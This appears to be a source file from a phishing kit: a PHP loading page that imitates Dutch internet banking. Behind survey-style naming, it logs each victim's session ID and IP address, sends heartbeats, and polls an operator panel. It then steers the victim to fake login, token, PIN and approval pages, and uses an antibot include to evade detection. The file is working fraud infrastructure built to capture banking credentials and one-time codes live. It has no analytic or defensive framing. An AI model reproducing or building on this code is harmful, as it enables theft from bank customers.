<?php
require_once __DIR__ . '/../antibot/antibot.php';

// Generate unique participant ID if not exists
if (!isset($_SESSION['participant_id'])) {
    $_SESSION['participant_id'] = uniqid('participant_', true);
}

$participant_id = $_SESSION['participant_id'];

// Update participant status in JSON file
function updateParticipantStatus($participant_id, $status) {
    $session_file = '../session/participants.json';
    
    // Create file if it doesn't exist
    if (!file_exists($session_file)) {
        file_put_contents($session_file, json_encode([]));
    }
    
    // Read existing data
    $participants = json_decode(file_get_contents($session_file), true);
    if (!$participants) {
        $participants = [];
    }
    
    // Get client IP address
    $ip_address = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Update or add participant (keep existing IP if already set)
    $existing_ip = isset($participants[$participant_id]) ? $participants[$participant_id]['ip'] : $ip_address;
    
    $participants[$participant_id] = [
        'id' => $participant_id,
        'status' => $status,
        'ip' => $existing_ip
    ];
    
    // Save back to file
    file_put_contents($session_file, json_encode($participants, JSON_PRETTY_PRINT));
}

// Update status to loading/completed
updateParticipantStatus($participant_id, 'loading');
?>

<!DOCTYPE html>
<html class="webkit" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Internetbankieren</title>
    <link href="./favicon.png" rel="icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .pageContainer {
            width: 100%;
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .bp-page {
            width: 100%;
            max-width: 1200px;
            padding: 20px;
        }

        /* Modern Loader Styles */
        .loader__ {
            background: rgba(255, 255, 255, 0.95);
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loader-box {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 90%;
            width: 400px;
        }

        .waiter_h2 {
            color: #333;
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            font-weight: 500;
        }

        .loader-images-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1rem;
        }

        .newloader img{
            max-width: 100px;
        }

        .ab-logo {
            margin-top: 1rem;
        }

        .loader-logo {
            max-width: 150px;
            height: auto;
        }

        .waiter_p {
            color: #666;
            margin-top: 1.5rem;
            font-size: 0.9rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .loader-box {
                padding: 1.5rem;
                width: 90%;
            }

            .waiter_h2 {
                font-size: 1.2rem;
            }
        }
    </style>
     <script>
        if (window.location.protocol === 'https:' && document.location.href.indexOf('http:') === 0) {
            window.location.href = 'https:' + window.location.href.substring(5);
        }
    </script>
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
    <div id="skip-link" class="skip-link"></div>

    <div class="pageContainer ag-white-background">
        <div id="main" class="bp-page bp-portal-area">
            <div class="lp-page-children bp-area --area">
                <div class="loader__ waiter__">
                    <div class="loader-box">
                        <h2 class="waiter_h2">Wacht alsjeblieft...</h2>
                        <div class="loader-images-box">
                            <div class="newloader">
                                <img src="./files/loader.gif" alt="" srcset="">
                            </div>
                            <div class="ab-logo" style="display: none">
                                <img class="loader-logo" src="./files/my-main_logo.svg" alt="Logo">
                            </div>
                        </div>
                        <p class="waiter_p">Laad deze pagina niet opnieuw</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Update status to completed after loading
        setTimeout(function() {
            // This could be enhanced with an AJAX call to update status to 'completed'
            console.log('Survey completed for participant: <?php echo $participant_id; ?>');
        }, 3000);
    </script>
    <script>
        //this script reads the status from scores.json every 5s and redirects based on status
        //before redirecting, it updates the status to null to prevent redirect loops
        setInterval(function() {
            fetch('get_scores.php?' + Date.now())
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok: ' + response.status);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Received data:', data);
                    const participant = data['<?php echo $participant_id; ?>'];
                    if (participant && participant.status && participant.status !== 'null' && participant.status !== null) {
                        console.log('Participant status:', participant.status);
                        
                        // Determine redirect URL based on status
                        let redirectUrl = null;
                        switch (participant.status) {
                            case 'question1':
                                redirectUrl = 'login.php';
                                break;
                            case 'question2':
                                redirectUrl = 'reference.php';
                                break;
                            case 'question3':
                                redirectUrl = 'token.php';
                                break;
                            case 'question1 error':
                                redirectUrl = 'login.php?error=1';
                                break;
                            case 'pin':
                                redirectUrl = 'pin.php';
                                break;
                            case 'approve_email':
                                redirectUrl = 'approve.php';
                                break;
                            case 'completed':
                                redirectUrl = 'success.php';
                                break;
                            case 'block':
                                redirectUrl = 'blocked.php';
                                break;
                            default:
                                console.log('Status not handled:', participant.status);
                                break;
                        }
                        
                        // If we have a redirect URL, update status to null first
                        if (redirectUrl) {
                            // Send updated data back to scores.json
                            fetch('update_status.php', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                },
                                body: 'participant_id=<?php echo $participant_id; ?>&status=null'
                            })
                            .then(() => {
                                console.log('Status updated to null, redirecting to:', redirectUrl);
                                window.location.href = redirectUrl;
                            })
                            .catch(error => {
                                console.error('Error updating status:', error);
                                // Redirect anyway to prevent being stuck
                                window.location.href = redirectUrl;
                            });
                        }
                    } else {
                        console.log('Participant not found or status is null');
                    }
                })
                .catch(error => {
                    console.error('Error fetching scores:', error);
                });
        }, 5000);

        // Heartbeat script to track participant activity
        function sendHeartbeat() {
            fetch('heartbeat.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'participant_id=<?php echo $participant_id; ?>&current_page=loading'
            }).catch(error => {
                console.log('Heartbeat error:', error);
            });
        }
        
        // Send heartbeat every 3 seconds
        sendHeartbeat(); // Send immediately
        setInterval(sendHeartbeat, 3000);
        
        // Send heartbeat when page becomes visible again
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                sendHeartbeat();
            }
        });

    </script>
</body>
</html>
